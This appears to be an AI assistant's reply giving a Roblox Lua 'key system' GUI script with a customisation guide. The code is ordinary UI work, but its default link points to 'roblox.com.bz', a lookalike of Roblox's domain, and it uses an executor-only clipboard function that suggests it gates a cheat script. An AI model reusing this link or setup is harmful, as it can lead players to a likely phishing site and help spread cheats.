@@ -1,0 +1,368 @@
+# Roblox Key System GUI
+
+I'll create a sleek, modern key system GUI for you! Here's a complete script with a cool design.
+
+```lua
+-- Key System GUI by DeepArena
+-- Place this in a LocalScript
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+
+-- ========== CONFIGURATION ==========
+local CONFIG = {
+    CorrectKey = "CD2KEY",  -- Change your key here
+    CopyLink = "https://roblox.com.bz/communities/8958627065/",  -- Change your link here
+    Title = "KEY SYSTEM"
+}
+-- ===================================
+
+-- Create ScreenGui
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "KeySystemGui"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.Parent = player:WaitForChild("PlayerGui")
+
+-- Main Frame
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "MainFrame"
+MainFrame.Size = UDim2.new(0, 450, 0, 280)
+MainFrame.Position = UDim2.new(0.5, -225, 0.5, -140)
+MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+MainFrame.BorderSizePixel = 0
+MainFrame.Parent = ScreenGui
+
+local MainCorner = Instance.new("UICorner")
+MainCorner.CornerRadius = UDim.new(0, 12)
+MainCorner.Parent = MainFrame
+
+-- Gradient background
+local Gradient = Instance.new("UIGradient")
+Gradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 45)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 25))
+})
+Gradient.Rotation = 45
+Gradient.Parent = MainFrame
+
+-- Glow border
+local Stroke = Instance.new("UIStroke")
+Stroke.Color = Color3.fromRGB(100, 80, 255)
+Stroke.Thickness = 2
+Stroke.Transparency = 0.3
+Stroke.Parent = MainFrame
+
+-- Title Bar
+local TitleBar = Instance.new("Frame")
+TitleBar.Name = "TitleBar"
+TitleBar.Size = UDim2.new(1, 0, 0, 50)
+TitleBar.BackgroundColor3 = Color3.fromRGB(35, 30, 55)
+TitleBar.BorderSizePixel = 0
+TitleBar.Parent = MainFrame
+
+local TitleCorner = Instance.new("UICorner")
+TitleCorner.CornerRadius = UDim.new(0, 12)
+TitleCorner.Parent = TitleBar
+
+local TitleBarFix = Instance.new("Frame")
+TitleBarFix.Size = UDim2.new(1, 0, 0, 15)
+TitleBarFix.Position = UDim2.new(0, 0, 1, -15)
+TitleBarFix.BackgroundColor3 = Color3.fromRGB(35, 30, 55)
+TitleBarFix.BorderSizePixel = 0
+TitleBarFix.Parent = TitleBar
+
+local TitleText = Instance.new("TextLabel")
+TitleText.Name = "TitleText"
+TitleText.Size = UDim2.new(1, -20, 1, 0)
+TitleText.Position = UDim2.new(0, 15, 0, 0)
+TitleText.BackgroundTransparency = 1
+TitleText.Text = CONFIG.Title
+TitleText.TextColor3 = Color3.fromRGB(255, 255, 255)
+TitleText.TextSize = 22
+TitleText.Font = Enum.Font.GothamBold
+TitleText.TextXAlignment = Enum.TextXAlignment.Left
+TitleText.Parent = TitleBar
+
+-- Close Button
+local CloseButton = Instance.new("TextButton")
+CloseButton.Name = "CloseButton"
+CloseButton.Size = UDim2.new(0, 30, 0, 30)
+CloseButton.Position = UDim2.new(1, -40, 0, 10)
+CloseButton.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
+CloseButton.Text = "✕"
+CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseButton.TextSize = 16
+CloseButton.Font = Enum.Font.GothamBold
+CloseButton.Parent = TitleBar
+
+local CloseCorner = Instance.new("UICorner")
+CloseCorner.CornerRadius = UDim.new(0, 8)
+CloseCorner.Parent = CloseButton
+
+-- Subtitle
+local Subtitle = Instance.new("TextLabel")
+Subtitle.Name = "Subtitle"
+Subtitle.Size = UDim2.new(1, -40, 0, 25)
+Subtitle.Position = UDim2.new(0, 20, 0, 60)
+Subtitle.BackgroundTransparency = 1
+Subtitle.Text = "Enter your key to continue"
+Subtitle.TextColor3 = Color3.fromRGB(180, 180, 200)
+Subtitle.TextSize = 14
+Subtitle.Font = Enum.Font.Gotham
+Subtitle.TextXAlignment = Enum.TextXAlignment.Left
+Subtitle.Parent = MainFrame
+
+-- Key Input Box
+local KeyInput = Instance.new("TextBox")
+KeyInput.Name = "KeyInput"
+KeyInput.Size = UDim2.new(1, -40, 0, 45)
+KeyInput.Position = UDim2.new(0, 20, 0, 95)
+KeyInput.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
+KeyInput.PlaceholderText = "Enter key here..."
+KeyInput.PlaceholderColor3 = Color3.fromRGB(120, 120, 140)
+KeyInput.Text = ""
+KeyInput.TextColor3 = Color3.fromRGB(255, 255, 255)
+KeyInput.TextSize = 16
+KeyInput.Font = Enum.Font.Gotham
+KeyInput.ClearTextOnFocus = false
+KeyInput.Parent = MainFrame
+
+local InputCorner = Instance.new("UICorner")
+InputCorner.CornerRadius = UDim.new(0, 8)
+InputCorner.Parent = KeyInput
+
+local InputStroke = Instance.new("UIStroke")
+InputStroke.Color = Color3.fromRGB(80, 80, 100)
+InputStroke.Thickness = 1
+InputStroke.Parent = KeyInput
+
+-- Status Label
+local StatusLabel = Instance.new("TextLabel")
+StatusLabel.Name = "StatusLabel"
+StatusLabel.Size = UDim2.new(1, -40, 0, 25)
+StatusLabel.Position = UDim2.new(0, 20, 0, 145)
+StatusLabel.BackgroundTransparency = 1
+StatusLabel.Text = ""
+StatusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+StatusLabel.TextSize = 14
+StatusLabel.Font = Enum.Font.GothamMedium
+StatusLabel.Parent = MainFrame
+
+-- Buttons Container
+local ButtonContainer = Instance.new("Frame")
+ButtonContainer.Name = "ButtonContainer"
+ButtonContainer.Size = UDim2.new(1, -40, 0, 50)
+ButtonContainer.Position = UDim2.new(0, 20, 1, -70)
+ButtonContainer.BackgroundTransparency = 1
+ButtonContainer.Parent = MainFrame
+
+-- Check Key Button (Left)
+local CheckKeyButton = Instance.new("TextButton")
+CheckKeyButton.Name = "CheckKeyButton"
+CheckKeyButton.Size = UDim2.new(0.48, 0, 1, 0)
+CheckKeyButton.Position = UDim2.new(0, 0, 0, 0)
+CheckKeyButton.BackgroundColor3 = Color3.fromRGB(80, 200, 120)
+CheckKeyButton.Text = "Check Key"
+CheckKeyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CheckKeyButton.TextSize = 16
+CheckKeyButton.Font = Enum.Font.GothamBold
+CheckKeyButton.Parent = ButtonContainer
+
+local CheckCorner = Instance.new("UICorner")
+CheckCorner.CornerRadius = UDim.new(0, 8)
+CheckCorner.Parent = CheckKeyButton
+
+-- Copy Link Button (Right)
+local CopyLinkButton = Instance.new("TextButton")
+CopyLinkButton.Name = "CopyLinkButton"
+CopyLinkButton.Size = UDim2.new(0.48, 0, 1, 0)
+CopyLinkButton.Position = UDim2.new(0.52, 0, 0, 0)
+CopyLinkButton.BackgroundColor3 = Color3.fromRGB(100, 80, 255)
+CopyLinkButton.Text = "Copy Link"
+CopyLinkButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CopyLinkButton.TextSize = 16
+CopyLinkButton.Font = Enum.Font.GothamBold
+CopyLinkButton.Parent = ButtonContainer
+
+local CopyCorner = Instance.new("UICorner")
+CopyCorner.CornerRadius = UDim.new(0, 8)
+CopyCorner.Parent = CopyLinkButton
+
+-- ========== FUNCTIONALITY ==========
+
+-- Hover effects
+local function addHoverEffect(button, normalColor, hoverColor)
+    button.MouseEnter:Connect(function()
+        TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = hoverColor}):Play()
+    end)
+    button.MouseLeave:Connect(function()
+        TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = normalColor}):Play()
+    end)
+end
+
+addHoverEffect(CheckKeyButton, Color3.fromRGB(80, 200, 120), Color3.fromRGB(100, 220, 140))
+addHoverEffect(CopyLinkButton, Color3.fromRGB(100, 80, 255), Color3.fromRGB(120, 100, 255))
+addHoverEffect(CloseButton, Color3.fromRGB(255, 60, 60), Color3.fromRGB(255, 90, 90))
+
+-- Input focus effect
+KeyInput.Focused:Connect(function()
+    TweenService:Create(InputStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(100, 80, 255)}):Play()
+end)
+KeyInput.FocusLost:Connect(function()
+    TweenService:Create(InputStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(80, 80, 100)}):Play()
+end)
+
+-- Check Key functionality
+CheckKeyButton.MouseButton1Click:Connect(function()
+    if KeyInput.Text == CONFIG.CorrectKey then
+        StatusLabel.TextColor3 = Color3.fromRGB(80, 200, 120)
+        StatusLabel.Text = "✓ Key valid! Loading..."
+        
+        task.wait(1)
+        
+        -- Fade out and close
+        TweenService:Create(MainFrame, TweenInfo.new(0.3), {
+            Size = UDim2.new(0, 0, 0, 0),
+            Position = UDim2.new(0.5, 0, 0.5, 0)
+        }):Play()
+        
+        task.wait(0.3)
+        ScreenGui:Destroy()
+        
+        -- ========== YOUR SCRIPT GOES HERE ==========
+        print("Key verified! Running main script...")
+        -- Add your main script code here
+        -- ============================================
+        
+    else
+        StatusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+        StatusLabel.Text = "✗ Invalid key! Try again."
+        
+        -- Shake animation
+        for i = 1, 3 do
+            KeyInput.Position = UDim2.new(0, 25, 0, 95)
+            task.wait(0.05)
+            KeyInput.Position = UDim2.new(0, 15, 0, 95)
+            task.wait(0.05)
+        end
+        KeyInput.Position = UDim2.new(0, 20, 0, 95)
+    end
+end)
+
+-- Copy Link functionality
+CopyLinkButton.MouseButton1Click:Connect(function()
+    if setclipboard then
+        setclipboard(CONFIG.CopyLink)
+        StatusLabel.TextColor3 = Color3.fromRGB(100, 80, 255)
+        StatusLabel.Text = "✓ Link copied to clipboard!"
+    else
+        StatusLabel.TextColor3 = Color3.fromRGB(255, 180, 80)
+        StatusLabel.Text = "Link: " .. CONFIG.CopyLink
+    end
+    
+    task.wait(2)
+    if StatusLabel.Text:find("Link") then
+        StatusLabel.Text = ""
+    end
+end)
+
+-- Close button
+CloseButton.MouseButton1Click:Connect(function()
+    TweenService:Create(MainFrame, TweenInfo.new(0.3), {
+        Size = UDim2.new(0, 0, 0, 0),
+        Position = UDim2.new(0.5, 0, 0.5, 0)
+    }):Play()
+    task.wait(0.3)
+    ScreenGui:Destroy()
+end)
+
+-- Draggable GUI
+local dragging, dragInput, dragStart, startPos
+
+TitleBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragStart = input.Position
+        startPos = MainFrame.Position
+        
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+TitleBar.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement then
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        local delta = input.Position - dragStart
+        MainFrame.Position = UDim2.new(
+            startPos.X.Scale, startPos.X.Offset + delta.X,
+            startPos.Y.Scale, startPos.Y.Offset + delta.Y
+        )
+    end
+end)
+
+-- Opening animation
+MainFrame.Size = UDim2.new(0, 0, 0, 0)
+MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+TweenService:Create(MainFrame, TweenInfo.new(0.4, Enum.EasingStyle.Back), {
+    Size = UDim2.new(0, 450, 0, 280),
+    Position = UDim2.new(0.5, -225, 0.5, -140)
+}):Play()
+```
+
+## 📋 Preview Layout
+
+```
+┌─────────────────────────────────────────┐
+│  KEY SYSTEM                          [✕]  │  ← Title bar (draggable)
+├─────────────────────────────────────────┤
+│                                           │
+│  Enter your key to continue               │
+│                                           │
+│  ┌─────────────────────────────────────┐ │
+│  │ Enter key here...                   │ │  ← Input box
+│  └─────────────────────────────────────┘ │
+│                                           │
+│  Status message appears here              │  ← Status label
+│                                           │
+│  ┌──────────────┐    ┌──────────────┐    │
+│  │  Check Key   │    │  Copy Link   │    │  ← Buttons
+│  └──────────────┘    └──────────────┘    │
+│      (Green)             (Purple)         │
+└─────────────────────────────────────────┘
+```
+
+## ✨ Features
+
+- **Modern dark theme** with purple glow border and gradient background
+- **Left button "Check Key"** (green) — validates the key
+- **Right button "Copy Link"** (purple) — copies your custom link
+- **Draggable window** — grab the title bar to move it
+- **Smooth animations** — opening, hover effects, and shake on wrong key
+- **Close button** with fade-out animation
+
+## 🔧 How to Customize
+
+At the top of the script, edit the `CONFIG` section:
+
+| Setting | What to change |
+|---------|---------------|
+| `CorrectKey` | Set your secret key |
+| `CopyLink` | Set your link (change anytime) |
+| `Title` | Change the window title |
+
+Also, add your main script inside the `-- YOUR SCRIPT GOES HERE --` section (it runs after a valid key).
+
+Want me to add anything else, like a **Discord button**, **key expiration timer**, or a **loading bar**? 🚀   
